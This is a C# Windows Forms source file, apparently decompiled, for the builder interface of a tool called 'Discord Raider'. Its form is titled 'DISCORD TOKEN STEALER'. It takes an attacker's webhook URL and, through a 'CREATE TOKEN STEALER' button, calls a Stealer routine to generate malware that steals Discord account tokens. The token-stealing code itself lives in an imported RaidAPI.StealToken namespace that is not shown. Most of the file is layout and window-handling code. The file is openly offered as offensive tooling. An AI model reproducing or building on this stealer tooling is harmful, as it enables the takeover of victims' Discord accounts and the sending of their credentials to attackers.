using RaidAPI.StealToken;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace DiscordRaider
{
  public class StealerForm : Form
  {
    private IContainer components;
    private Panel WebhookPnl;
    private TextBox WebHookTxt;
    private Panel panel37;
    private Panel HeadLinePnlInf;
    private Panel panel24;
    private Button CloseBtn;
    private Label HeadServerLbl;
    private Panel panel25;
    private ComboBox comboBox3;
    private TextBox textBox3;
    private Button button4;
    private Panel panel26;
    private Panel panel27;
    private Panel panel36;
    private NotifyIcon WinInfo;
    private RoundBtn CreateBtn;
    private RoundBtn TutorialBtn;

    public StealerForm()
    {
      this.InitializeComponent();
      this.ChangeCorners();
      this.ChangeWebhookPnl();
    }

    private void ChangeCorners()
    {
      Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
      GraphicsPath path = new GraphicsPath();
      int num = 20;
      path.AddArc(rectangle.X, rectangle.Y, num, num, 180f, 90f);
      path.AddArc(rectangle.X + rectangle.Width - num, rectangle.Y, num, num, 270f, 90f);
      path.AddArc(rectangle.X + rectangle.Width - num, rectangle.Y + rectangle.Height - num, num, num, 0.0f, 90f);
      path.AddArc(rectangle.X, rectangle.Y + rectangle.Height - num, num, num, 90f, 90f);
      this.Region = new Region(path);
    }

    private void ChangeWebhookPnl()
    {
      Rectangle rectangle = new Rectangle(0, 0, this.WebhookPnl.Width, this.WebhookPnl.Height);
      GraphicsPath path = new GraphicsPath();
      int num = 20;
      path.AddArc(rectangle.X, rectangle.Y, num, num, 180f, 90f);
      path.AddArc(rectangle.X + rectangle.Width - num, rectangle.Y, num, num, 270f, 90f);
      path.AddArc(rectangle.X + rectangle.Width - num, rectangle.Y + rectangle.Height - num, num, num, 0.0f, 90f);
      path.AddArc(rectangle.X, rectangle.Y + rectangle.Height - num, num, num, 90f, 90f);
      this.WebhookPnl.Region = new Region(path);
    }

    private void CloseBtn_Click(object sender, EventArgs e)
    {
      Main._Show = true;
      Main._StealerForm = false;
      this.Close();
    }

    private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
    {
      Point point1 = Control.MousePosition;
      int x1 = point1.X;
      point1 = this.Location;
      int x2 = point1.X;
      Mouse.x = x1 - x2;
      Point point2 = Control.MousePosition;
      int y1 = point2.Y;
      point2 = this.Location;
      int y2 = point2.Y;
      Mouse.y = y1 - y2;
    }

    private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      Mouse.newpoint = Control.MousePosition;
      Mouse.newpoint.X -= Mouse.x;
      Mouse.newpoint.Y -= Mouse.y;
      this.Location = Mouse.newpoint;
    }

    private void HeadLinePnlInf_MouseDown(object sender, MouseEventArgs e)
    {
      Point point1 = Control.MousePosition;
      int x1 = point1.X;
      point1 = this.Location;
      int x2 = point1.X;
      Mouse.x = x1 - x2;
      Point point2 = Control.MousePosition;
      int y1 = point2.Y;
      point2 = this.Location;
      int y2 = point2.Y;
      Mouse.y = y1 - y2;
    }

    private void HeadLinePnlInf_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      Mouse.newpoint = Control.MousePosition;
      Mouse.newpoint.X -= Mouse.x;
      Mouse.newpoint.Y -= Mouse.y;
      this.Location = Mouse.newpoint;
    }

    private void WebHookTxt_Enter(object sender, EventArgs e)
    {
      if (!(this.WebHookTxt.Text == "WebHook Here"))
        return;
      this.WebHookTxt.Text = "";
      this.WebHookTxt.ForeColor = Color.White;
    }

    private void WebHookTxt_Leave(object sender, EventArgs e)
    {
      if (!(this.WebHookTxt.Text == ""))
        return;
      this.WebHookTxt.Text = "WebHook Here";
      this.WebHookTxt.ForeColor = Color.Silver;
    }

    private void CreateBtn_Click(object sender, EventArgs e)
    {
      if (this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here")
      {
        int num = (int) MessageBox.Show("You need to paste a Webhook first!", "Discord Raider");
      }
      else
      {
        Stealer.Dialog(this.WebHookTxt.Text);
        this.WinInfo.Visible = true;
        this.WinInfo.BalloonTipText = "Token Stealer Created :D";
        this.WinInfo.ShowBalloonTip(1000);
      }
    }

    private void TutorialBtn_Click(object sender, EventArgs e) => Process.Start("https://imgur.com/a/SSquRQ2");

    private void StealerForm_FormClosing(object sender, FormClosingEventArgs e) => Main._StealerForm = false;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (StealerForm));
      this.WebhookPnl = new Panel();
      this.WebHookTxt = new TextBox();
      this.panel37 = new Panel();
      this.HeadLinePnlInf = new Panel();
      this.panel24 = new Panel();
      this.CloseBtn = new Button();
      this.HeadServerLbl = new Label();
      this.panel25 = new Panel();
      this.comboBox3 = new ComboBox();
      this.textBox3 = new TextBox();
      this.button4 = new Button();
      this.panel26 = new Panel();
      this.panel27 = new Panel();
      this.panel36 = new Panel();
      this.WinInfo = new NotifyIcon(this.components);
      this.CreateBtn = new RoundBtn();
      this.TutorialBtn = new RoundBtn();
      this.WebhookPnl.SuspendLayout();
      this.HeadLinePnlInf.SuspendLayout();
      this.SuspendLayout();
      this.WebhookPnl.BackColor = Color.FromArgb(49, 50, 55);
      this.WebhookPnl.Controls.Add((Control) this.WebHookTxt);
      this.WebhookPnl.Location = new Point(13, 41);
      this.WebhookPnl.Name = "WebhookPnl";
      this.WebhookPnl.Size = new Size(395, 32);
      this.WebhookPnl.TabIndex = 6307;
      this.WebHookTxt.BackColor = Color.FromArgb(49, 50, 55);
      this.WebHookTxt.BorderStyle = BorderStyle.None;
      this.WebHookTxt.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.WebHookTxt.ForeColor = Color.DarkGray;
      this.WebHookTxt.Location = new Point(7, 7);
      this.WebHookTxt.Name = "WebHookTxt";
      this.WebHookTxt.Size = new Size(379, 18);
      this.WebHookTxt.TabIndex = 6153;
      this.WebHookTxt.Text = "WebHook Here";
      this.WebHookTxt.Enter += new EventHandler(this.WebHookTxt_Enter);
      this.WebHookTxt.Leave += new EventHandler(this.WebHookTxt_Leave);
      this.panel37.BackColor = Color.FromArgb(51, 51, 51);
      this.panel37.Location = new Point(-1507, 118);
      this.panel37.Name = "panel37";
      this.panel37.Size = new Size(3814, 2);
      this.panel37.TabIndex = 6306;
      this.HeadLinePnlInf.BackColor = Color.FromArgb(33, 34, 38);
      this.HeadLinePnlInf.Controls.Add((Control) this.panel24);
      this.HeadLinePnlInf.Controls.Add((Control) this.CloseBtn);
      this.HeadLinePnlInf.Controls.Add((Control) this.HeadServerLbl);
      this.HeadLinePnlInf.Controls.Add((Control) this.panel25);
      this.HeadLinePnlInf.Controls.Add((Control) this.comboBox3);
      this.HeadLinePnlInf.Controls.Add((Control) this.textBox3);
      this.HeadLinePnlInf.Controls.Add((Control) this.button4);
      this.HeadLinePnlInf.Controls.Add((Control) this.panel26);
      this.HeadLinePnlInf.Controls.Add((Control) this.panel27);
      this.HeadLinePnlInf.Controls.Add((Control) this.panel36);
      this.HeadLinePnlInf.Dock = DockStyle.Top;
      this.HeadLinePnlInf.Location = new Point(0, 0);
      this.HeadLinePnlInf.Name = "HeadLinePnlInf";
      this.HeadLinePnlInf.Size = new Size(421, 29);
      this.HeadLinePnlInf.TabIndex = 6305;
      this.HeadLinePnlInf.MouseDown += new MouseEventHandler(this.HeadLinePnlInf_MouseDown);
      this.HeadLinePnlInf.MouseMove += new MouseEventHandler(this.HeadLinePnlInf_MouseMove);
      this.panel24.BackColor = Color.FromArgb(51, 51, 51);
      this.panel24.Location = new Point(12, 24);
      this.panel24.Name = "panel24";
      this.panel24.Size = new Size(396, 2);
      this.panel24.TabIndex = 6222;
      this.CloseBtn.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Right;
      this.CloseBtn.BackColor = Color.FromArgb(33, 34, 38);
      this.CloseBtn.FlatAppearance.BorderColor = Color.FromArgb(51, 110, 123);
      this.CloseBtn.FlatAppearance.BorderSize = 0;
      this.CloseBtn.FlatStyle = FlatStyle.Flat;
      this.CloseBtn.Font = new Font("Webdings", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 2);
      this.CloseBtn.ForeColor = Color.White;
      this.CloseBtn.Location = new Point(395, -1);
      this.CloseBtn.Name = "CloseBtn";
      this.CloseBtn.Size = new Size(26, 27);
      this.CloseBtn.TabIndex = 6167;
      this.CloseBtn.Text = "r";
      this.CloseBtn.TextAlign = ContentAlignment.TopCenter;
      this.CloseBtn.UseVisualStyleBackColor = false;
      this.CloseBtn.Click += new EventHandler(this.CloseBtn_Click);
      this.HeadServerLbl.AutoSize = true;
      this.HeadServerLbl.Font = new Font("Microsoft Tai Le", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.HeadServerLbl.ForeColor = Color.White;
      this.HeadServerLbl.Location = new Point(105, 3);
      this.HeadServerLbl.Name = "HeadServerLbl";
      this.HeadServerLbl.Size = new Size(206, 21);
      this.HeadServerLbl.TabIndex = 6166;
      this.HeadServerLbl.Text = "DISCORD TOKEN STEALER";
      this.HeadServerLbl.MouseDown += new MouseEventHandler(this.HeadServerLbl_MouseDown);
      this.HeadServerLbl.MouseMove += new MouseEventHandler(this.HeadServerLbl_MouseMove);
      this.panel25.BackColor = Color.FromArgb(51, 51, 51);
      this.panel25.Font = new Font("Segoe UI", 9f);
      this.panel25.Location = new Point(362, -44);
      this.panel25.Name = "panel25";
      this.panel25.Size = new Size(2, 25);
      this.panel25.TabIndex = 6160;
      this.comboBox3.BackColor = Color.FromArgb(25, 25, 25);
      this.comboBox3.DropDownStyle = ComboBoxStyle.DropDownList;
      this.comboBox3.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold);
      this.comboBox3.ForeColor = Color.Silver;
      this.comboBox3.FormattingEnabled = true;
      this.comboBox3.Location = new Point(364, -44);
      this.comboBox3.Name = "comboBox3";
      this.comboBox3.Size = new Size(254, 25);
      this.comboBox3.TabIndex = 6154;
      this.textBox3.BackColor = Color.FromArgb(25, 25, 25);
      this.textBox3.BorderStyle = BorderStyle.None;
      this.textBox3.Font = new Font("Segoe UI", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.textBox3.ForeColor = Color.White;
      this.textBox3.Location = new Point(364, -42);
      this.textBox3.Multiline = true;
      this.textBox3.Name = "textBox3";
      this.textBox3.Size = new Size(231, 21);
      this.textBox3.TabIndex = 6156;
      this.textBox3.Text = " Voice Channel";
      this.button4.BackColor = Color.FromArgb(25, 25, 25);
      this.button4.FlatAppearance.BorderColor = Color.FromArgb(142, 68, 173);
      this.button4.FlatAppearance.BorderSize = 0;
      this.button4.FlatStyle = FlatStyle.Flat;
      this.button4.Font = new Font("Webdings", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 2);
      this.button4.ForeColor = Color.Silver;
      this.button4.Location = new Point(594, -43);
      this.button4.Name = "button4";
      this.button4.Size = new Size(25, 22);
      this.button4.TabIndex = 6155;
      this.button4.Text = "6";
      this.button4.UseVisualStyleBackColor = false;
      this.panel26.BackColor = Color.FromArgb(51, 51, 51);
      this.panel26.Font = new Font("Segoe UI", 9f);
      this.panel26.Location = new Point(364, -21);
      this.panel26.Name = "panel26";
      this.panel26.Size = new Size(254, 2);
      this.panel26.TabIndex = 6157;
      this.panel27.BackColor = Color.FromArgb(51, 51, 51);
      this.panel27.Font = new Font("Segoe UI", 9f);
      this.panel27.Location = new Point(364, -44);
      this.panel27.Name = "panel27";
      this.panel27.Size = new Size(254, 2);
      this.panel27.TabIndex = 6158;
      this.panel36.BackColor = Color.FromArgb(51, 51, 51);
      this.panel36.Font = new Font("Segoe UI", 9f);
      this.panel36.Location = new Point(617, -44);
      this.panel36.Name = "panel36";
      this.panel36.Size = new Size(2, 25);
      this.panel36.TabIndex = 6159;
      this.WinInfo.BalloonTipTitle = "Discord Raider";
      this.WinInfo.Icon = (Icon) componentResourceManager.GetObject("WinInfo.Icon");
      this.WinInfo.Visible = true;
      this.CreateBtn.BorderColor = Color.FromArgb(105, 105, 205);
      this.CreateBtn.ButtonColor = Color.FromArgb(105, 105, 205);
      this.CreateBtn.FlatAppearance.BorderColor = Color.FromArgb(33, 34, 38);
      this.CreateBtn.FlatAppearance.BorderSize = 0;
      this.CreateBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(33, 34, 38);
      this.CreateBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(33, 34, 38);
      this.CreateBtn.FlatStyle = FlatStyle.Flat;
      this.CreateBtn.Font = new Font("Segoe UI Black", 8.25f, FontStyle.Bold);
      this.CreateBtn.Location = new Point(13, 81);
      this.CreateBtn.Name = "CreateBtn";
      this.CreateBtn.OnHoverBorderColor = Color.FromArgb(88, 99, 180);
      this.CreateBtn.OnHoverButtonColor = Color.FromArgb(88, 99, 180);
      this.CreateBtn.OnHoverTextColor = Color.White;
      this.CreateBtn.Size = new Size(194, 25);
      this.CreateBtn.TabIndex = 6319;
      this.CreateBtn.Text = "CREATE TOKEN STEALER";
      this.CreateBtn.TextColor = Color.White;
      this.CreateBtn.UseVisualStyleBackColor = true;
      this.CreateBtn.Click += new EventHandler(this.CreateBtn_Click);
      this.TutorialBtn.BorderColor = Color.FromArgb(105, 105, 205);
      this.TutorialBtn.ButtonColor = Color.FromArgb(105, 105, 205);
      this.TutorialBtn.FlatAppearance.BorderColor = Color.FromArgb(33, 34, 38);
      this.TutorialBtn.FlatAppearance.BorderSize = 0;
      this.TutorialBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(33, 34, 38);
      this.TutorialBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(33, 34, 38);
      this.TutorialBtn.FlatStyle = FlatStyle.Flat;
      this.TutorialBtn.Font = new Font("Segoe UI Black", 8.25f, FontStyle.Bold);
      this.TutorialBtn.Location = new Point(212, 81);
      this.TutorialBtn.Name = "TutorialBtn";
      this.TutorialBtn.OnHoverBorderColor = Color.FromArgb(88, 99, 180);
      this.TutorialBtn.OnHoverButtonColor = Color.FromArgb(88, 99, 180);
      this.TutorialBtn.OnHoverTextColor = Color.White;
      this.TutorialBtn.Size = new Size(195, 25);
      this.TutorialBtn.TabIndex = 6320;
      this.TutorialBtn.Text = "SHOW TUTORIAL";
      this.TutorialBtn.TextColor = Color.White;
      this.TutorialBtn.UseVisualStyleBackColor = true;
      this.TutorialBtn.Click += new EventHandler(this.TutorialBtn_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(33, 34, 38);
      this.ClientSize = new Size(421, 134);
      this.Controls.Add((Control) this.TutorialBtn);
      this.Controls.Add((Control) this.CreateBtn);
      this.Controls.Add((Control) this.WebhookPnl);
      this.Controls.Add((Control) this.panel37);
      this.Controls.Add((Control) this.HeadLinePnlInf);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (StealerForm);
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "Discord Raider | Stealer";
      this.FormClosing += new FormClosingEventHandler(this.StealerForm_FormClosing);
      this.WebhookPnl.ResumeLayout(false);
      this.WebhookPnl.PerformLayout();
      this.HeadLinePnlInf.ResumeLayout(false);
      this.HeadLinePnlInf.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
